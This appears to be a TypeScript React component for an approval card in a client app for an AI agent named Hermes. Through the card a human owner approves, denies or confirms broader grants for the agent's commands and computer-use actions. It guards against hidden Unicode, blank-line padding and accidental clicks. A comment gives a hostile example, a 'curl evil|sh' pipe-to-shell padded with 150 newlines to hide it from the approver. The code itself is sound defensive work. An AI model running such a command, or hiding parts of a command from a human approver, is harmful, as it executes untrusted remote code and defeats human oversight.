// An Approval card: the command Hermes wants to run and the answers it offers. A broader grant asks again first.
import { useCallback, useId, useRef, useState, type MouseEvent } from "react";
import { ShieldAlert } from "lucide-react";
import type { ApprovalChoice, ApprovalItem } from "../hermes/model";
import { endedNote, isBroadGrant, offeredChoices } from "../hermes/model";
import { BRING_TO_FRONT, grantWords, otherScope, type CuAsk } from "../hermes/computerUse";
import { useLocale } from "../i18n/locale";

const CHOICE_LABEL: Record<ApprovalChoice, string> = {
  once: "Approve once",
  session: "Allow for this chat…",
  always: "Always allow…",
  deny: "Deny",
};

const ANSWERED_LABEL: Record<ApprovalChoice, string> = {
  once: "Approved once",
  session: "Allowed for this chat",
  always: "Always allowed",
  deny: "Denied",
};

/**
 * Characters that hide what runs: Unicode control and format characters, such as bidi overrides and zero-width spaces,
 * except newline and tab; the line and paragraph separators, which break a line where none is; and letters that draw
 * nothing (the Hangul fillers and the blank Braille pattern) (#489).
 */
const HIDDEN = /(?![\n\t])[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\u115F\u1160\u3164\uFFA0\u2800]/gu;

/** Text from Hermes with its hidden characters written out, so what shows is what runs. */
export const visible = (text: string) => text.replace(HIDDEN, (c) => `\\u{${c.codePointAt(0)!.toString(16).toUpperCase()}}`);

/** More blank lines than this in a row show as one marker saying how many, so they can't push a line out of sight. */
const BLANK_RUN = 2;

/**
 * A command as the card shows it: its hidden characters written out, and each run of more than `BLANK_RUN` blank lines
 * replaced by a marker, so `curl evil|sh #`, 150 newlines and then `echo "running tests"` reads as all three (#489).
 */
function CommandText({ command }: { command: string }) {
  const lines = visible(command).split("\n");
  const parts: ({ text: string } | { blank: number })[] = [];
  for (let i = 0; i < lines.length; ) {
    let end = i;
    while (end < lines.length && !/\S/u.test(lines[end])) end++;
    if (end - i > BLANK_RUN) {
      parts.push({ blank: end - i });
      i = end;
    } else {
      parts.push({ text: lines[i] });
      i++;
    }
  }
  return (
    <>
      <pre className="approval-cmd">
        {parts.map((p, i) => (
          <span key={i}>
            {i > 0 && "\n"}
            {"blank" in p ? <span className="approval-gap">{`[${p.blank} blank lines]`}</span> : p.text}
          </span>
        ))}
      </pre>
      {lines.length > 1 && <div className="approval-lines">{lines.length} lines</div>}
    </>
  );
}

/** A computer_use Approval's body: the action once the heading no longer says it, the window it aims at, and how it is delivered. */
function CuBody({ ask, app, closed }: { ask: CuAsk; app?: string; closed: boolean }) {
  const l = useLocale().chat.computerUse.ask;
  const raises = ask.verb === BRING_TO_FRONT;
  const tip = raises ? l.raiseTip : l.scopeTip[ask.scope];
  return (
    <div className="approval-cu">
      {closed && <code className="approval-target">{visible(ask.target)}</code>}
      {app && <span className="cu-app">{l.in(visible(app))}</span>}
      <span className={`cu-scope ${raises ? "foreground" : ask.scope}`} title={tip}>
        {raises ? l.raise : l.scope[ask.scope]}
      </span>
      {!closed && <div className="approval-desc">{tip}</div>}
    </div>
  );
}

/** How long buttons ignore clicks after they appear, so a click aimed at what was there before doesn't answer. */
export const ARM_MS = 400;

/**
 * Wraps a button's action so it runs only on a deliberate click: not the second click of a double click (`detail`
 * counts them; a keyboard press has none), and not within `ARM_MS` of the buttons appearing or of `movedAt`, when
 * the transcript last changed and may have moved them under the pointer.
 */
export function useDeliberate(movedAt: number) {
  const [shownAt] = useState(() => performance.now());
  return (act: () => void) => (e: MouseEvent) => {
    if (e.detail <= 1 && e.timeStamp - Math.max(shownAt, movedAt) >= ARM_MS) act();
  };
}

/**
 * Only the answers Hermes offers show. `movedAt`: when the transcript last changed (`useDeliberate`). `onAnswer` gets
 * `confirmed` once the owner has confirmed a broader grant. A card takes no focus when it arrives, so typing elsewhere
 * never answers it. It is answered only by clicking, or by Enter or Space on a focused button; no shortcut answers it.
 * Offline, the buttons stay focusable but do nothing, so a reconnect doesn't drop the owner's place.
 */
export function ApprovalCard({
  item,
  offline,
  movedAt = 0,
  app,
  onAnswer,
}: {
  item: ApprovalItem;
  offline: boolean;
  movedAt?: number;
  /** For a computer_use action: the window the gated step aimed at, when it named one. */
  app?: string;
  onAnswer: (c: ApprovalChoice, confirmed?: boolean) => void;
}) {
  const [confirming, setConfirming] = useState<ApprovalChoice>();
  const deliberate = useDeliberate(movedAt);
  const closed = item.answer ?? item.ended;
  const choices = offeredChoices(item);
  const l = useLocale().chat.computerUse.ask;
  const { cua } = item;
  const what = cua && grantWords(cua, l);
  const label = (c: ApprovalChoice) => (!cua || !what ? CHOICE_LABEL[c] : c === "once" ? l.once : c === "session" ? l.session(what) : c === "always" ? l.always(what) : l.deny);
  const heading = cua ? l.heading(visible(cua.target)) : "Hermes wants to run a command";
  const card = useRef<HTMLDivElement>(null);
  const headId = useId();
  // The buttons go when the card closes, however it closes, and when a grant's confirmation opens or goes back. If one
  // had focus, focus stays on the card instead of falling to the page, so the owner keeps their place and a repeated
  // key lands on nothing.
  const keepFocus = useCallback((actions: HTMLDivElement | null) => {
    return () => void (actions?.contains(document.activeElement) && card.current?.isConnected && card.current.focus());
  }, []);
  return (
    <div ref={card} tabIndex={-1} role="group" aria-labelledby={headId} data-item={item.id} className={`approval ${closed ? "answered" : ""}`}>
      <div className="approval-head" id={headId}>
        <ShieldAlert size={15} />
        {item.answer ? ANSWERED_LABEL[item.answer] : item.ended ? endedNote(item.ended) : heading}
      </div>
      {cua ? <CuBody ask={cua} app={app} closed={!!closed} /> : <CommandText command={item.command} />}
      {!closed && (
        <>
          {item.description && !cua && <div className="approval-desc">{visible(item.description)}</div>}
          {confirming ? (
            <ConfirmGrant
              item={item}
              choice={confirming}
              offline={offline}
              movedAt={movedAt}
              keepFocus={keepFocus}
              onConfirm={() => onAnswer(confirming, true)}
              onBack={() => setConfirming(undefined)}
            />
          ) : choices.length ? (
            <div className="approval-actions" ref={keepFocus}>
              {choices.map((c) => (
                <button
                  key={c}
                  className={`btn ${c === "once" ? "primary" : ""}`}
                  aria-disabled={offline || undefined}
                  onClick={deliberate(() => !offline && (isBroadGrant(c) ? setConfirming(c) : onAnswer(c)))}
                >
                  {label(c)}
                </button>
              ))}
            </div>
          ) : (
            <div className="approval-desc">Hermes offered no answer this app can give. It stops waiting on its own.</div>
          )}
        </>
      )}
    </div>
  );
}

/**
 * The second step of a broader grant. Its buttons are new elements, so the focus or a double click on the button that
 * opened it can't confirm, and Back takes focus, so a stray Enter goes back.
 */
export function ConfirmGrant({
  item,
  choice,
  offline,
  movedAt = 0,
  keepFocus,
  onConfirm,
  onBack,
}: {
  item: ApprovalItem;
  choice: ApprovalChoice;
  offline: boolean;
  movedAt?: number;
  /** The card's ref for its buttons, which keeps focus on the card when they go. */
  keepFocus?: (actions: HTMLDivElement | null) => void;
  onConfirm: () => void;
  onBack: () => void;
}) {
  const deliberate = useDeliberate(movedAt);
  const l = useLocale().chat.computerUse.ask;
  const { cua } = item;
  const what = cua ? grantWords(cua, l) : item.description ? `commands Hermes flags as “${visible(item.description)}”` : "commands like this";
  const always = choice === "always";
  const words = cua
    ? (always ? l.confirmAlways : l.confirmSession)(what, otherScope(cua.scope))
    : always
      ? `Always allow ${what}? Hermes won't ask again before running them, in any chat.`
      : `Allow ${what} for the rest of this chat? Hermes won't ask again before running them here.`;
  return (
    <div className="approval-confirm">
      <div className="approval-desc">{words}</div>
      <div className="approval-actions" ref={keepFocus}>
        <button className="btn danger" aria-disabled={offline || undefined} onClick={deliberate(() => !offline && onConfirm())}>
          {cua ? (always ? l.yesAlways : l.yesSession) : always ? "Yes, always allow" : "Yes, allow for this chat"}
        </button>
        <button className="btn" autoFocus onClick={onBack}>
          {cua ? l.back : "Back"}
        </button>
      </div>
    </div>
  );
}
